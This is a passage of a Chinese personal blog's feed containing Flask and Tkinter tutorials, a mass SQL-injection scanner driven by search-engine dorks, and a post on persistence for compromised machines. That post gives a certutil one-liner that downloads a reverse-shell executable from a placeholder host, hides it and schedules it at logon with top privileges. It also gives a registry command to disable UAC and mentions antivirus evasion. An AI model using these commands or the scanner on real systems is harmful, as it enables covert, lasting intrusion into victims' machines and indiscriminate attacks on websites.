World!&apos;</div><div class="line">@app.route(&apos;/welcome/&lt;name&gt;&apos;)</div><div class="line">def welcome():</div><div class="line">    return str(url_for(&apos;hello_world&apos;))</div><div class="line">@app.route(&apos;/about&apos;)</div><div class="line">def about():</div><div class="line">    return &apos;The about page&apos;</div><div class="line"></div><div class="line">@app.route(&apos;/test&apos;)</div><div class="line">def test():</div><div class="line">    print (url_for(&apos;hello_world&apos;))</div><div class="line">    print (url_for(&apos;about&apos;,abc=&apos;123&apos;))</div><div class="line">    print (url_for(&apos;welcome&apos;,name=&apos;123&apos;))</div><div class="line">    return &apos;test&apos;</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/</div><div class="line">/about?abc=123</div><div class="line">/welcome/123</div></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li><code>url_for</code>  的参数是已经创建的方法名</li><li><code>url_for</code>  中的方法名需要用引号引起来</li></ul><h2 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h2><p>默认只允许 <code>GET</code> 请求</p><p>如果要允许其他请求方法，那么则需要通过装饰器提供的 <code>methods</code> 参数来改变</p><h4 id="一个小例子"><a href="#一个小例子" class="headerlink" title="一个小例子"></a>一个小例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from flask import Flask,url_for,request</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])</div><div class="line">def index():</div><div class="line">    return request.method</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><h4 id="常见-HTTP-方法"><a href="#常见-HTTP-方法" class="headerlink" title="常见 HTTP 方法"></a>常见 HTTP 方法</h4><ul><li>GET</li><li>HEAD</li><li>POST</li><li>PUT</li><li>DELETE</li><li>OPTIONS</li></ul><h2 id="渲染模板"><a href="#渲染模板" class="headerlink" title="渲染模板"></a>渲染模板</h2><p>说简单点就是一个 html 的页面</p><p>还是需要先引入<code>render_template</code> 这个模块</p><p><code>from flask import render_template</code></p><p>然后在当前目录创建 <code>templates</code> 文件夹，并将 <code>html</code> 文件放入改文件夹中</p><p><a href="http://jinja.pocoo.org/docs/2.10/templates/" target="_blank" rel="external">参考</a></p><h2 id="静态文件处理"><a href="#静态文件处理" class="headerlink" title="静态文件处理"></a>静态文件处理</h2><p><code>CSS</code> 和 <code>JavaScipt</code> 文件的自动处理</p><ul><li>1.创建 <code>static</code> 文件夹</li><li>2.将静态文件放进 <code>static</code></li><li>3.修改<code>html</code>中的<code>css</code> <code>js</code> 的路径为 <code>/static/xxx.js</code></li></ul><h2 id="接收请求数据"><a href="#接收请求数据" class="headerlink" title="接收请求数据"></a>接收请求数据</h2><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p><code>from flask impoort request</code></p><h4 id="小例子-1"><a href="#小例子-1" class="headerlink" title="小例子"></a>小例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from flask import Flask,request</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])</div><div class="line">def index():</div><div class="line"></div><div class="line">    return str(request.form)</div><div class="line">    #return str(request.headers)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><p><code>form</code> 和 <code>args</code> 返回值是字典格式的</p><h4 id="request请求对象-总结"><a href="#request请求对象-总结" class="headerlink" title="request请求对象 总结"></a>request请求对象 总结</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">path    # 请求的 url</div><div class="line">method  # 请求方法</div><div class="line">form    # post过来的数据</div><div class="line">args    # get 过来的数据</div><div class="line">json    # post 过来的json数据</div><div class="line">header  # 查看请求头</div></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>确保在你的 HTML 表单中不要忘记设置属性 <code>enctype=&quot;multipart/form-data&quot;</code>， 否则浏览器将不传送文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">from flask import request</div><div class="line"></div><div class="line">@app.route(&apos;/upload&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</div><div class="line">def upload_file():</div><div class="line">    if request.method == &apos;POST&apos;:</div><div class="line">        f = request.files[&apos;the_file&apos;]</div><div class="line">        f.save(&apos;/var/www/uploads/uploaded_file.txt&apos;)</div></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>你能够用 <code>redirect()</code> 函数重定向用户到其它地方。能够用 <code>abort()</code> 函数提前中断一个请求并带有一个错误代码</p><ul><li>redirect  重定向到一个url上</li><li>abort     自定义出错状态码，并且直接中断，不运行后面的</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from flask import Flask,url_for,redirect,abort</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])</div><div class="line">def hello_world():</div><div class="line">    abort(404)</div><div class="line">    return redirect(url_for(&apos;test&apos;))</div><div class="line"></div><div class="line">@app.route(&apos;/test&apos;)</div><div class="line">def test():</div><div class="line">    return &apos;hello&apos;</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><h2 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h2><p>使用 <code>errorhandler()</code> 装饰器</p><ul><li>创建的方法中应该含有一个 <code>error</code> 参数，用于确认到底是哪种出错</li><li>return 后面的数字就表示返回的状态码，如果是<code>405</code>就改成<code>405</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from flask import Flask,url_for,redirect,abort</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])</div><div class="line">def hello_world():</div><div class="line">    abort(404)</div><div class="line"></div><div class="line">@app.errorhandler(404)</div><div class="line">def page_404(error):</div><div class="line">    return (error)</div><div class="line">    #return &apos;&lt;h1&gt;404 NOT FOUND&lt;/h1&gt;&apos;,404</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;127.0.0.1&apos;,port=80,debug=True)</div></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer14&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer14&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;官方完整文档&quot;&gt;&lt;a href=&quot;#官方完整文档&quot; class=&quot;headerlink&quot; title=&quot;官方完整文档&quot;&gt;&lt;/a&gt;官方完整文档&lt;/h2&gt;&lt;h4 id=&quot;快速入门&quot;&gt;&lt;a href=&quot;#快速入门&quot; class=&quot;headerlink&quot; title=&quot;快速入门&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.pythondoc.com/flask/quickstart.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;快速入门&lt;/a&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_Scan</title>
    <link href="https://damit5.com/2018/03/23/Sqli-Scan/"/>
    <id>https://damit5.com/2018/03/23/Sqli-Scan/</id>
    <published>2018-03-23T08:32:12.000Z</published>
    <updated>2018-06-10T03:59:10.021Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer7" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer7"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="SQLI-SCAN"><a href="#SQLI-SCAN" class="headerlink" title="SQLI SCAN"></a>SQLI SCAN</h2><p>Sqli_Scan , 批量sql注入扫描器</p><p>首先从浏览器（Bing、Google、Yahoo）上根据关键词搜索符合条件的链接，再根据链接进行自动判断是否可能存在注入<br><a id="more"></a></p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul><li>python3</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/damit5/sqli_scan.git</div><div class="line"></div><div class="line">cd sqli_scan</div><div class="line"></div><div class="line">pip install -r requirements.txt</div></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">    ===============================================================================</div><div class="line"></div><div class="line">    _________________   .____    .___    _________</div><div class="line">    /   _____/\_____  \ |    |   |   |  /   _____/ ____ _____    ____</div><div class="line">    \_____  \  /  / \  \|    |   |   |  \_____  \_/ ___\\__  \  /    \</div><div class="line">    /        \/   \_/.  \    |___|   |  /        \  \___ / __ \|   |  \</div><div class="line">   /_______  /\_____\ \_/_______ \___| /_______  /\___  &gt;____  /___|  /</div><div class="line">           \/        \__&gt;       \/             \/     \/     \/     \/</div><div class="line">                                                                        d4m1ts</div><div class="line">    ===============================================================================</div><div class="line"></div><div class="line">usage: sqli_scan.py [-h] [-k inurl:example] [-p 5] [-e search engine]</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help        show this help message and exit</div><div class="line">  -k inurl:example  sql injection keyword</div><div class="line">  -p 5              page of websites to look for in search engine</div><div class="line">  -e search engine  the search engine you want to use. bing,yahoo,google</div></pre></td></tr></table></figure><blockquote><p>执行 <code>python sqli_scan.py -k inurl:php?id= -p 3 -e bing</code></p></blockquote><p><img src="https://github.com/damit5/sqli_scan/raw/master/img/1.png" alt="image"></p><h2 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h2><p><a href="https://asciinema.org/a/171948" target="_blank" rel="external"><img src="https://asciinema.org/a/171948.png" alt="Demo"></a></p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a><a href="https://github.com/damit5/sqli_scan" target="_blank" rel="external">项目地址</a></h2>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer7&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer7&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;SQLI-SCAN&quot;&gt;&lt;a href=&quot;#SQLI-SCAN&quot; class=&quot;headerlink&quot; title=&quot;SQLI SCAN&quot;&gt;&lt;/a&gt;SQLI SCAN&lt;/h2&gt;&lt;p&gt;Sqli_Scan , 批量sql注入扫描器&lt;/p&gt;
&lt;p&gt;首先从浏览器（Bing、Google、Yahoo）上根据关键词搜索符合条件的链接，再根据链接进行自动判断是否可能存在注入&lt;br&gt;
    
    </summary>
    
    
      <category term="SQLI" scheme="https://damit5.com/tags/SQLI/"/>
    
  </entry>
  
  <entry>
    <title>权限维持之开机获取管理员权限</title>
    <link href="https://damit5.com/2018/01/06/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E5%BC%80%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/"/>
    <id>https://damit5.com/2018/01/06/权限维持之开机获取管理员权限/</id>
    <published>2018-01-06T13:37:32.000Z</published>
    <updated>2018-06-10T04:00:27.071Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer17" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer17"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>看了看上一篇博客的时间已经是去年了，所以今天还是来水一篇吧，证明我还活着<br><a id="more"></a><br>很早之前就想写这玩意儿了，只不过一直因为时间问题一直拖到了现在，经过2天的各种查资料终于写出了一个最简单的</p><p>这里必须要吐槽一下360，流氓软件出身的果然不一样，修改注册表拦截，移动文件到启动目录拦截，system32文件夹下载文件拦截，你就说你有什么不拦截吧！！！</p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>先获取肉鸡的管理员权限，然后通过一系列手段达到肉鸡重启后能再次反弹一个管理员权限shell的目的（如果肉鸡装了360。。。直接跳过吧，不知道怎么绕过拦截添加计划任务）</p><p>思路：</p><ul><li>msf 上线</li><li>添加计划任务</li></ul><p>细分一下：</p><ol><li>msf上线</li><li>进入<code>c:/windows</code>文件夹</li><li>自动下载可执行文件（就是你的反弹shell）</li><li>添加计划任务</li></ol><h2 id="0x02-具体操作"><a href="#0x02-具体操作" class="headerlink" title="0x02 具体操作"></a>0x02 具体操作</h2><p>拿到管理员权限过后也就执行一句话</p><p><code>cd C:/Windows&amp;&amp;certutil -urlcache -split -f https://xxx/svchost.exe&amp;&amp;attrib +s +h svchost.exe&amp;&amp;schtasks.exe /Create /TN update /TR C:\Windows\svchost.vbs /SC ONLOGON /F /RL HIGHEST</code></p><p>每个命令大概解释</p><ol><li>进入 <code>C:/Windnws</code> 文件夹</li><li>下载我的反弹shell（这个是弹到msf上的）</li><li>隐藏我的shell文件</li><li>新建一个计划任务，在用户登陆后开始执行</li></ol><h2 id="0x03-解决问题"><a href="#0x03-解决问题" class="headerlink" title="0x03 解决问题"></a>0x03 解决问题</h2><p>你的<code>reverse_shell</code>需要解决的问题</p><ul><li>免杀 （自己想办法解决吧）</li><li>能自行判断肉鸡是否联网（因为开机直接运行，没联网的话也就凉凉了）</li></ul><p>演示视频：<a href="https://youtu.be/IYKFERG_53Y" target="_blank" rel="external">https://youtu.be/IYKFERG_53Y</a></p><h2 id="0x04-也有简单粗暴的办法"><a href="#0x04-也有简单粗暴的办法" class="headerlink" title="0x04 也有简单粗暴的办法"></a>0x04 也有简单粗暴的办法</h2><ol><li><p>关闭UAC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v EnableLUA /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></li><li><p>将自己的shell可执行文件名字修改为 <code>setup</code>或者<code>install</code>或者<code>uninstall</code>等本来会触发UAC的关键字</p></li><li><p>加入开机项</p><ul><li>修改注册表</li><li>直接加入开机目录</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer17&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer17&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;看了看上一篇博客的时间已经是去年了，所以今天还是来水一篇吧，证明我还活着&lt;br&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Tkinter 学习笔记</title>
    <link href="https://damit5.com/2017/12/11/Tkinter-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://damit5.com/2017/12/11/Tkinter-学习笔记/</id>
    <published>2017-12-11T05:58:35.000Z</published>
    <updated>2018-06-10T03:59:26.637Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer9" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer9"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</p><a id="more"></a><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>所有的组件都需要加入布局（例如<code>pack()</code>），这样才会显示出来</p><p>话需要在括号里面指明是哪一个面板，例如 <code>button = Tkinter.Button(window)</code></p><p>相当于java的加入面板<code>add</code>吧</p><hr><p><code>mainloop()</code> 相当于 java的 <code>setvisible=True</code></p><hr><h2 id="1-继承Frame类别"><a href="#1-继承Frame类别" class="headerlink" title="1.继承Frame类别"></a>1.继承Frame类别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import Tkinter</div><div class="line"></div><div class="line"># 继承 Frame 类</div><div class="line">class Application(Tkinter.Frame):</div><div class="line">    # 初始化函数</div><div class="line">    def __init__(self,master=None):</div><div class="line">        Tkinter.Frame.__init__(self,master)</div><div class="line">        self.pack()</div><div class="line">        self.add()</div><div class="line"></div><div class="line">    # 添加组件函数</div><div class="line">    def add(self):</div><div class="line">        self.But = Tkinter.Button(self,text=&apos;QUIT&apos;,command=self.quit,fg=&apos;RED&apos;)</div><div class="line">        self.But.pack()</div><div class="line"></div><div class="line">        self.Butt = Tkinter.Button(self,text=&apos;PRINT&apos;,command=self.out,fg=&apos;blue&apos;)</div><div class="line">        self.Butt.pack()</div><div class="line"></div><div class="line">        self.text = Tkinter.Entry(self)</div><div class="line">        self.text.pack()</div><div class="line"></div><div class="line">    # 调用输出的函数</div><div class="line">    def out(self):</div><div class="line">        # 从 Entry 中获取内容</div><div class="line">        self.content = self.text.get()</div><div class="line">        print self.content</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app = Application()</div><div class="line">    # 设置窗口标题</div><div class="line">    app.master.title(&apos;hello&apos;)</div><div class="line"></div><div class="line">    # 主消息循环</div><div class="line">    app.mainloop()</div></pre></td></tr></table></figure><h2 id="2-不用类，直接-Tk"><a href="#2-不用类，直接-Tk" class="headerlink" title="2.不用类，直接  Tk()"></a>2.不用类，直接  Tk()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 关键语句</div><div class="line">from Tkinter import *</div><div class="line">app = Tk(className=&apos;test&apos;)</div><div class="line">app.mainloop()</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">from Tkinter import *</div><div class="line">import tkMessageBox</div><div class="line">import sys</div><div class="line"></div><div class="line"># 弹窗退出</div><div class="line">def out():</div><div class="line">    tkMessageBox.showinfo(title=&apos;MESSAGE&apos;, message=&apos;ERROR&apos;)</div><div class="line">    sys.exit(0)</div><div class="line"></div><div class="line"># 命令行问好</div><div class="line">def say_hello():</div><div class="line">    tkMessageBox.showinfo(title=&apos;HELLO&apos;, message=&apos;Love you so much !&apos;)</div><div class="line"></div><div class="line"></div><div class="line">def frame():</div><div class="line">    app = Tk(className=&apos;test&apos;)</div><div class="line"></div><div class="line">    # 括号里面加上 窗口的名字 进行区分，不然同时多个的话分不清楚</div><div class="line">    # 创建列表组件</div><div class="line">    language = [&apos;C&apos;,&apos;C++&apos;,&apos;Python&apos;,&apos;Java&apos;,&apos;Lua&apos;,&apos;php&apos;]</div><div class="line">    listb = Listbox(app)</div><div class="line">    for i in language:</div><div class="line">        listb.insert(0,i)</div><div class="line">    listb.pack()</div><div class="line"></div><div class="line">    # 创建按钮组件,button1弹窗后退出,button2只是弹窗</div><div class="line">    button1 = Button(app,text=&apos;QUIT&apos;,command=out,fg=&apos;RED&apos;)</div><div class="line">    button1.pack(side=&apos;left&apos;,expand=1)</div><div class="line">    button2 = Button(text=&apos;HELLO&apos;,command=say_hello,fg=&apos;GREEN&apos;)</div><div class="line">    button2.pack(side=&apos;right&apos;)</div><div class="line"></div><div class="line"></div><div class="line">    app.mainloop()</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    frame()</div></pre></td></tr></table></figure><hr><h2 id="窗口主体框架"><a href="#窗口主体框架" class="headerlink" title="窗口主体框架"></a>窗口主体框架</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import Tkinter</div><div class="line">window = Tkinter.Tk(screenName=None, baseName=None, className=&apos;Hello&apos;, useTk=1, sync=0, use=None)</div><div class="line">window.geometry(&apos;900x600&apos;)  # 设置面板的大小 /dʒiˈɒmətri/</div><div class="line">window[&apos;bg&apos;] = &apos;black&apos;      # 设置背景色</div><div class="line"></div><div class="line">window.mainloop()           # 显示出来</div></pre></td></tr></table></figure><h2 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h2><h4 id="基本上通用的属性"><a href="#基本上通用的属性" class="headerlink" title="基本上通用的属性"></a>基本上通用的属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bg = &apos;black&apos;,       # 背景色</div><div class="line"># bg = &apos;#000000&apos;    # 也可以使用颜色代码</div><div class="line">fg = &apos;green&apos;,       # 前景色</div><div class="line">font = (&apos;Arial&apos;,15),# 字体和大小</div></pre></td></tr></table></figure><h4 id="Label-标签"><a href="#Label-标签" class="headerlink" title="Label 标签"></a>Label 标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">label = Tkinter.Label(</div><div class="line">window,             # 添加组件的面板</div><div class="line">text = &apos;OMG&apos;,       # 显示的文字</div><div class="line">bg = &apos;green&apos;,       # 背景颜色</div><div class="line">fg = &apos;red&apos;,         # 前景色</div><div class="line">font = (&apos;Arial&apos;,20),# 字体和大小</div><div class="line">width = 15,         # 宽</div><div class="line">height = 2          # 高</div><div class="line">)</div><div class="line">label.pack(side=&apos;bottom&apos;,expand=1) # pack固定组件模式的一种，side表示固定的位置（默认top）</div></pre></td></tr></table></figure><h4 id="Button-按钮"><a href="#Button-按钮" class="headerlink" title="Button 按钮"></a>Button 按钮</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">button = Tkinter.Button(</div><div class="line">window,             # 添加组件的面板</div><div class="line">text = &apos;hit me&apos;,    # 显示内容</div><div class="line">bg = &apos;black&apos;,       # 背景色</div><div class="line">fg = &apos;green&apos;,       # 前景色</div><div class="line">width = 15,         # 宽</div><div class="line">height = 2,         # 高</div><div class="line">font = (&apos;Arial&apos;,15),# 字体和大小</div><div class="line"></div><div class="line">command = quit      # 执行的函数，quit表示退出</div><div class="line"></div><div class="line">)</div><div class="line">button.pack(side=&apos;right&apos;)</div><div class="line"></div><div class="line"># button[&apos;text&apos;] = &apos;233&apos;</div><div class="line"># 改变按钮的text</div></pre></td></tr></table></figure><h4 id="Entry-简单文本"><a href="#Entry-简单文本" class="headerlink" title="Entry 简单文本"></a>Entry 简单文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div 